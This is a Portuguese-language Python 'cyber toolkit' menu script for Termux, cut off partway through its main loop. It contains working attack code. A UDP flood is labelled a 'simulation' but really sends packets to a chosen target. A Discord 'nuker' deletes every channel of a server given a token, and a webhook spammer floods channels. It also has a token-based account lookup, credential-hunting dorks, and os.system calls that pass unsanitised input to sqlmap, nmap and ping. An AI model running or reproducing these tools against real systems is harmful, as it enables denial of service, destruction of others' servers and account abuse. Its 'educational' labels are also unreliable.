#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MAIDZ CYBER TOOLKIT v2.0 (FINAL - SEM ERROS)
Terminal personalizado + ferramentas de cybersegurança (estudo)
Desenvolvido para Termux / Linux
"""

import os
import sys
import time
import socket
import random
import json
import requests
from datetime import datetime
from colorama import init, Fore, Style

init(autoreset=True)

USER_NAME = "cruz"
HOST_NAME = "localhost"

CYBERFETCH_ART = f"""
{Fore.LIGHTWHITE_EX}                       +                      
{Fore.LIGHTWHITE_EX}                     +++                     
{Fore.LIGHTMAGENTA_EX}                    +++++                    
{Fore.LIGHTMAGENTA_EX}                   +++++++                   
{Fore.LIGHTWHITE_EX}                   ++++++=+                  
{Fore.LIGHTWHITE_EX}                  ++++++++=                 
{Fore.LIGHTMAGENTA_EX}                 ++++++++++=                
{Fore.LIGHTMAGENTA_EX}                + ++++++++++=                
{Fore.LIGHTWHITE_EX}               +++++++++++++==               
{Fore.LIGHTWHITE_EX}              ======+++++++++==              
{Fore.LIGHTMAGENTA_EX}             ============+++++==             
{Fore.LIGHTMAGENTA_EX}            ========+++++++++++==            
{Fore.LIGHTWHITE_EX}           =====++++++++++++++++++           
{Fore.LIGHTWHITE_EX}          ==+++++++++++++++++++++++          
{Fore.LIGHTMAGENTA_EX}         ++++++++++++   ++++++++++++         
{Fore.LIGHTMAGENTA_EX}        *++++++++++       +++++++++++        
{Fore.LIGHTWHITE_EX}       +++++++++++         +++++++++++       
{Fore.LIGHTWHITE_EX}      ++++++++++++         *+++++++++++      
{Fore.LIGHTMAGENTA_EX}     ++++++++++++*         *+++++++++*++     
{Fore.LIGHTMAGENTA_EX}    *+++++++++++++         +++++++++++++     
{Fore.LIGHTWHITE_EX}   +++++++++++*               *+++++++++++   
{Fore.LIGHTWHITE_EX}  ++++++++                         *+++++++  
{Fore.LIGHTMAGENTA_EX} *++++                                 +++++ 
{Fore.LIGHTMAGENTA_EX}++*                                       +*+
{Style.RESET_ALL}
"""

def cyberfetch():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(CYBERFETCH_ART)
    print(f"{Fore.LIGHTMAGENTA_EX}════════════════════════════════════════════════════")
    print(f"{Fore.LIGHTWHITE_EX}  MAIDZ CYBER TEAM  ")
    print(f"{Fore.LIGHTWHITE_EX}  ✦ Pentest | OSINT | Dorking | Exploits ✦")
    print(f"{Fore.LIGHTMAGENTA_EX}════════════════════════════════════════════════════")
    print(f"{Fore.LIGHTWHITE_EX}  Usuário : {Fore.LIGHTMAGENTA_EX}{USER_NAME}")
    print(f"{Fore.LIGHTWHITE_EX}  Host    : {Fore.LIGHTMAGENTA_EX}{HOST_NAME}")
    print(f"{Fore.LIGHTWHITE_EX}  Data    : {Fore.LIGHTMAGENTA_EX}{datetime.now().strftime('%d/%m/%Y %H:%M')}")
    print(f"{Fore.LIGHTWHITE_EX}  Shell   : {Fore.LIGHTMAGENTA_EX}{os.environ.get('SHELL', '/bin/bash')}")
    print(f"{Fore.LIGHTMAGENTA_EX}════════════════════════════════════════════════════")
    print(f"{Fore.LIGHTWHITE_EX}  Ferramentas carregadas: 12")
    print(f"{Fore.LIGHTWHITE_EX}  Grupo: {Fore.LIGHTMAGENTA_EX}Maidz Cyber Team")
    print(f"{Fore.LIGHTMAGENTA_EX}════════════════════════════════════════════════════{Style.RESET_ALL}")

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

# =============================================================
# FERRAMENTAS
# =============================================================

def dorking_menu():
    clear()
    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] DORKING TOOLS{Style.RESET_ALL}")
    print(f"{Fore.LIGHTWHITE_EX}1. Google Dorks (exemplo){Style.RESET_ALL}")
    print(f"{Fore.LIGHTWHITE_EX}2. GitHub Dorks (busca por credenciais){Style.RESET_ALL}")
    print(f"{Fore.LIGHTWHITE_EX}3. PDF/Arquivos sensíveis{Style.RESET_ALL}")
    print(f"{Fore.LIGHTWHITE_EX}4. SQL Injection dorks{Style.RESET_ALL}")
    print(f"{Fore.LIGHTWHITE_EX}5. Voltar{Style.RESET_ALL}")
    opt = input(f"{Fore.LIGHTMAGENTA_EX}Escolha: {Style.RESET_ALL}")
    if opt == "1":
        print(f"{Fore.CYAN}[*] Exemplo de Google Dork: site:example.com intitle:index of {Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Lista completa: https://github.com/1d8/Google-Dorks{Style.RESET_ALL}")
    elif opt == "2":
        print(f"{Fore.CYAN}[*] GitHub Dorks: extension:env DB_PASSWORD {Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Buscar por credenciais expostas.{Style.RESET_ALL}")
    elif opt == "3":
        print(f"{Fore.CYAN}[*] PDF Dork: filetype:pdf confidential {Style.RESET_ALL}")
    elif opt == "4":
        print(f"{Fore.CYAN}[*] SQL Dork: inurl:id= site:example.com {Style.RESET_ALL}")
    else:
        return
    input(f"{Fore.LIGHTWHITE_EX}Pressione Enter para voltar...{Style.RESET_ALL}")

def ip_grabber():
    clear()
    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] IP GRABBER (gerador de link){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] Gera um link que captura o IP de quem clicar (via serviço externo).{Style.RESET_ALL}")
    url = input(f"{Fore.LIGHTWHITE_EX}URL de destino (ex: seu site): {Style.RESET_ALL}")
    if not url:
        url = "https://www.example.com"
    fake_link = f"https://ipgrabber.xyz/redirect?url={url}"
    print(f"{Fore.GREEN}[+] Link gerado: {fake_link}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Ao acessar, o IP será registrado (simulação).{Style.RESET_ALL}")
    input(f"{Fore.LIGHTWHITE_EX}Pressione Enter para voltar...{Style.RESET_ALL}")

def ip_pinger():
    clear()
    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] IP PINGER{Style.RESET_ALL}")
    target = input(f"{Fore.LIGHTWHITE_EX}IP ou domínio: {Style.RESET_ALL}")
    if not target:
        print(f"{Fore.RED}[!] Alvo não informado.{Style.RESET_ALL}")
        input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")
        return
    print(f"{Fore.CYAN}[*] Pingando {target}...{Style.RESET_ALL}")
    os.system(f"ping -c 4 {target}")
    input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")

def discord_account_shower():
    clear()
    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] DISCORD ACCOUNT SHOWER{Style.RESET_ALL}")
    token = input(f"{Fore.LIGHTWHITE_EX}Token Discord (ou ID): {Style.RESET_ALL}")
    if not token:
        print(f"{Fore.RED}[!] Token necessário.{Style.RESET_ALL}")
        input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")
        return
    headers = {"Authorization": token}
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            print(f"{Fore.GREEN}[+] Conta encontrada:{Style.RESET_ALL}")
            print(f"  Username: {data.get('username')}#{data.get('discriminator')}")
            print(f"  ID: {data.get('id')}")
            print(f"  Email: {data.get('email', 'Não disponível')}")
            print(f"  Verificado: {data.get('verified')}")
            print(f"  MFA: {data.get('mfa_enabled')}")
        else:
            print(f"{Fore.RED}[!] Erro: {r.status_code}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")
    input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")

def osint_searcher():
    clear()
    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] OSINT SEARCHER{Style.RESET_ALL}")
    query = input(f"{Fore.LIGHTWHITE_EX}Termo a pesquisar (nome, email, etc.): {Style.RESET_ALL}")
    if not query:
        return
    print(f"{Fore.CYAN}[*] Buscando informações sobre {query}...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] Usando serviços públicos (simulação).{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Google: https://www.google.com/search?q={query}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}LinkedIn: https://www.linkedin.com/search/results/all/?keywords={query}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}GitHub: https://github.com/search?q={query}{Style.RESET_ALL}")
    input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")

def leaks_searcher():
    clear()
    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] LEAKS SEARCHER{Style.RESET_ALL}")
    email = input(f"{Fore.LIGHTWHITE_EX}Email para verificar vazamentos: {Style.RESET_ALL}")
    if not email:
        return
    print(f"{Fore.CYAN}[*] Verificando se {email} está em vazamentos...{Style.RESET_ALL}")
    try:
        r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}", timeout=10)
        if r.status_code == 200:
            breaches = r.json()
            print(f"{Fore.RED}[+] Este email apareceu em {len(breaches)} vazamentos:{Style.RESET_ALL}")
            for b in breaches:
                print(f"  - {b.get('Name')} (Data: {b.get('BreachDate')})")
        elif r.status_code == 404:
            print(f"{Fore.GREEN}[+] Nenhum vazamento conhecido.{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[!] Erro na API: {r.status_code}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")
    input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")

def discord_spammer():
    clear()
    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] DISCORD SPAMMER (webhook){Style.RESET_ALL}")
    webhook = input(f"{Fore.LIGHTWHITE_EX}Webhook URL: {Style.RESET_ALL}")
    if not webhook:
        return
    msg = input(f"{Fore.LIGHTWHITE_EX}Mensagem a spammar: {Style.RESET_ALL}") or "SPAM!"
    count = int(input(f"{Fore.LIGHTWHITE_EX}Quantidade de mensagens: {Style.RESET_ALL}") or "5")
    delay = float(input(f"{Fore.LIGHTWHITE_EX}Delay entre mensagens (segundos): {Style.RESET_ALL}") or "0.5")
    print(f"{Fore.YELLOW}[!] ATENÇÃO: Isso pode resultar em banimento do webhook.{Style.RESET_ALL}")
    confirm = input(f"{Fore.LIGHTWHITE_EX}Continuar? (s/n): {Style.RESET_ALL}")
    if confirm.lower() != 's':
        return
    for i in range(count):
        try:
            payload = {"content": msg}
            r = requests.post(webhook, json=payload, timeout=5)
            if r.status_code == 204:
                print(f"{Fore.GREEN}[+] Mensagem {i+1} enviada.{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Erro: {r.status_code}{Style.RESET_ALL}")
            time.sleep(delay)
        except Exception as e:
            print(f"{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")
    input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")

def discord_nuker():
    clear()
    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] DISCORD NUKER (webhook){Style.RESET_ALL}")
    print(f"{Fore.RED}[!] Isso irá deletar canais, roles, etc. (apenas com permissões adequadas){Style.RESET_ALL}")
    token = input(f"{Fore.LIGHTWHITE_EX}Token do bot (ou usuário): {Style.RESET_ALL}")
    guild_id = input(f"{Fore.LIGHTWHITE_EX}ID do servidor: {Style.RESET_ALL}")
    if not token or not guild_id:
        return
    confirm = input(f"{Fore.RED}Realmente deseja nukear o servidor? (s/n): {Style.RESET_ALL}")
    if confirm.lower() != 's':
        return
    headers = {"Authorization": token}
    try:
        r = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers)
        if r.status_code == 200:
            channels = r.json()
            for ch in channels:
                print(f"{Fore.YELLOW}[*] Deletando canal: {ch.get('name')} ({ch.get('id')}){Style.RESET_ALL}")
                del_r = requests.delete(f"https://discord.com/api/v9/channels/{ch.get('id')}", headers=headers)
                if del_r.status_code == 200 or del_r.status_code == 204:
                    print(f"{Fore.GREEN}[+] Canal deletado.{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[!] Erro ao deletar canal: {del_r.status_code}{Style.RESET_ALL}")
                time.sleep(0.5)
        else:
            print(f"{Fore.RED}[!] Erro ao listar canais: {r.status_code}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")
    input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")

def discord_username_checker():
    clear()
    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] DISCORD USERNAME CHECKER{Style.RESET_ALL}")
    username = input(f"{Fore.LIGHTWHITE_EX}Nome a verificar: {Style.RESET_ALL}")
    if not username:
        return
    url = "https://discord.com/api/v10/unique-username/username-attempt-unauthed"
    payload = {"username": username}
    try:
        r = requests.post(url, json=payload, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("taken") == False:
                print(f"{Fore.GREEN}[+] {username} está DISPONÍVEL!{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] {username} já está em uso.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[!] Erro: {r.status_code}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")
    input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")

def dorking_tools():
    clear()
    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] DORKING TOOLS - EXTRA{Style.RESET_ALL}")
    print(f"{Fore.LIGHTWHITE_EX}1. SQLMap (injeção SQL){Style.RESET_ALL}")
    print(f"{Fore.LIGHTWHITE_EX}2. Nmap (escaneamento){Style.RESET_ALL}")
    print(f"{Fore.LIGHTWHITE_EX}3. Nikto (scanner web){Style.RESET_ALL}")
    opt = input(f"{Fore.LIGHTMAGENTA_EX}Escolha: {Style.RESET_ALL}")
    if opt == "1":
        url = input(f"{Fore.LIGHTWHITE_EX}URL alvo: {Style.RESET_ALL}")
        if url:
            os.system(f"sqlmap -u {url} --batch")
    elif opt == "2":
        target = input(f"{Fore.LIGHTWHITE_EX}Alvo: {Style.RESET_ALL}")
        if target:
            os.system(f"nmap -sV {target}")
    elif opt == "3":
        target = input(f"{Fore.LIGHTWHITE_EX}URL alvo: {Style.RESET_ALL}")
        if target:
            os.system(f"nikto -h {target}")
    else:
        print(f"{Fore.RED}[!] Opção inválida.{Style.RESET_ALL}")
    input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")

def tiktok_name_searcher():
    clear()
    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] TIKTOK NAME SEARCHER{Style.RESET_ALL}")
    username = input(f"{Fore.LIGHTWHITE_EX}Nome de usuário TikTok: {Style.RESET_ALL}")
    if not username:
        return
    url = f"https://www.tiktok.com/@{username}"
    print(f"{Fore.CYAN}[*] Verificando perfil: {url}{Style.RESET_ALL}")
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            print(f"{Fore.GREEN}[+] Perfil encontrado!{Style.RESET_ALL}")
        elif r.status_code == 404:
            print(f"{Fore.RED}[-] Perfil não encontrado (disponível).{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[!] Status: {r.status_code}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")
    input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")

def dos_attack():
    clear()
    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] DOS ATTACK (simulação){Style.RESET_ALL}")
    target = input(f"{Fore.LIGHTWHITE_EX}IP/domínio alvo: {Style.RESET_ALL}")
    port = int(input(f"{Fore.LIGHTWHITE_EX}Porta (ex: 80): {Style.RESET_ALL}") or "80")
    duration = int(input(f"{Fore.LIGHTWHITE_EX}Duração (segundos): {Style.RESET_ALL}") or "5")
    print(f"{Fore.YELLOW}[!] ATENÇÃO: Isso é uma simulação educacional.{Style.RESET_ALL}")
    confirm = input(f"{Fore.LIGHTWHITE_EX}Continuar? (s/n): {Style.RESET_ALL}")
    if confirm.lower() != 's':
        return
    try:
        target_ip = socket.gethostbyname(target)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_data = random._urandom(1490)
        end_time = time.time() + duration
        packets = 0
        print(f"{Fore.CYAN}[*] Enviando pacotes UDP para {target_ip}:{port}...{Style.RESET_ALL}")
        while time.time() < end_time:
            sock.sendto(bytes_data, (target_ip, port))
            packets += 1
            if packets % 500 == 0:
                sys.stdout.write(f"\r{Fore.GREEN}[+] Pacotes: {packets}{Style.RESET_ALL}")
                sys.stdout.flush()
        print(f"\n{Fore.GREEN}[+] Concluído. {packets} pacotes enviados.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")
    input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")

# =============================================================
# CONFIGURAÇÃO DO SHELL
# =============================================================
def setup_shell():
    shell_rc = os.path.expanduser("~/.bashrc")
    if os.path.exists(os.path.expanduser("~/.zshrc")):
        shell_rc = os.path.expanduser("~/.zshrc")

    lines_to_add = []
    lines_to_add.append('alias cyberfetch="python3 ' + os.path.abspath(sys.argv[0]) + ' --cyberfetch"')
    prompt_cmd = 'PS1="\\[\\033[37m\\]╭──(\\[\\033[35m\\]' + USER_NAME + '@' + HOST_NAME + '\\[\\033[37m\\])-(~)\\n\\[\\033[37m\\]╰──❯❯ \\[\\033[0m\\]"'
    lines_to_add.append(prompt_cmd)

    with open(shell_rc, 'r') as f:
        content = f.read()
    already = all(line in content for line in lines_to_add)
    if not already:
        with open(shell_rc, 'a') as f:
            f.write("\n# MAIDZ CYBER TOOLKIT CONFIG\n")
            for line in lines_to_add:
                f.write(line + "\n")
        print(f"{Fore.GREEN}[+] Configurações adicionadas ao {shell_rc}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Recarregue com: source {shell_rc}{Style.RESET_ALL}")
    else:
        print(f"{Fore.CYAN}[*] Configurações já presentes.{Style.RESET_ALL}")

# =============================================================
# MENU PRINCIPAL
# =============================================================
def main_menu():
    clear()
    cyberfetch()
    print(f"""
{Fore.LIGHTWHITE_EX}════════════════════════════════════════════════════
{Fore.LIGHTMAGENTA_EX}  [MAIDZ CYBER TOOLKIT] - Menu Principal
{Fore.LIGHTWHITE_EX}════════════════════════════════════════════════════
{Fore.LIGHTWHITE_EX}  1.  {Fore.LIGHTMAGENTA_EX}Dorking{Fore.LIGHTWHITE_EX} (vários tipos)
{Fore.LIGHTWHITE_EX}  2.  {Fore.LIGHTMAGENTA_EX}IP Grabber{Fore.LIGHTWHITE_EX} (gerar link)
{Fore.LIGHTWHITE_EX}  3.  {Fore.LIGHTMAGENTA_EX}IP Pinger{Fore.LIGHTWHITE_EX} (ping)
{Fore.LIGHTWHITE_EX}  4.  {Fore.LIGHTMAGENTA_EX}Discord Account Shower{Fore.LIGHTWHITE_EX}
{Fore.LIGHTWHITE_EX}  5.  {Fore.LIGHTMAGENTA_EX}OSINT Searcher{Fore.LIGHTWHITE_EX}
{Fore.LIGHTWHITE_EX}  6.  {Fore.LIGHTMAGENTA_EX}Leaks Searcher{Fore.LIGHTWHITE_EX}
{Fore.LIGHTWHITE_EX}  7.  {Fore.LIGHTMAGENTA_EX}Discord Spammer{Fore.LIGHTWHITE_EX} (webhook)
{Fore.LIGHTWHITE_EX}  8.  {Fore.LIGHTMAGENTA_EX}Discord Nuker{Fore.LIGHTWHITE_EX} (webhook)
{Fore.LIGHTWHITE_EX}  9.  {Fore.LIGHTMAGENTA_EX}Discord Username Checker{Fore.LIGHTWHITE_EX}
{Fore.LIGHTWHITE_EX}  10. {Fore.LIGHTMAGENTA_EX}Dorking Tools{Fore.LIGHTWHITE_EX} (SQLMap, Nmap, Nikto)
{Fore.LIGHTWHITE_EX}  11. {Fore.LIGHTMAGENTA_EX}TikTok Name Searcher{Fore.LIGHTWHITE_EX}
{Fore.LIGHTWHITE_EX}  12. {Fore.LIGHTMAGENTA_EX}DOS Attack{Fore.LIGHTWHITE_EX} (simulação)
{Fore.LIGHTWHITE_EX}  13. {Fore.LIGHTMAGENTA_EX}Sair{Fore.LIGHTWHITE_EX}
{Fore.LIGHTWHITE_EX}════════════════════════════════════════════════════
    """)
    return input(f"{Fore.LIGHTMAGENTA_EX}Escolha uma opção: {Style.RESET_ALL}").strip()

# =============================================================
# PONTO DE ENTRADA
# =============================================================
def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--cyberfetch":
        clear()
        cyberfetch()
        sys.exit(0)

    if not os.path.exists(os.path.expanduser("~/.maidz_setup_done")):
        print(f"{Fore.YELLOW}[!] Primeira execução. Configurando shell...{Style.RESET_ALL}")
        setup_shell()
        with open(os.path.expanduser("~/.maidz_setup_done"), 'w') as f:
            f.write("done")
        print(f"{Fore.GREEN}[+] Configuração concluída. Execute source ~/.bashrc (ou ~/.zshrc) para ativar.{Style.RESET_ALL}")
        input(f"{Fore.LIGHTWHITE_EX}Pressione Enter para continuar...{Style.RESET_ALL}")

    while True:
        opcao = main_menu()
        if opcao == "1":
           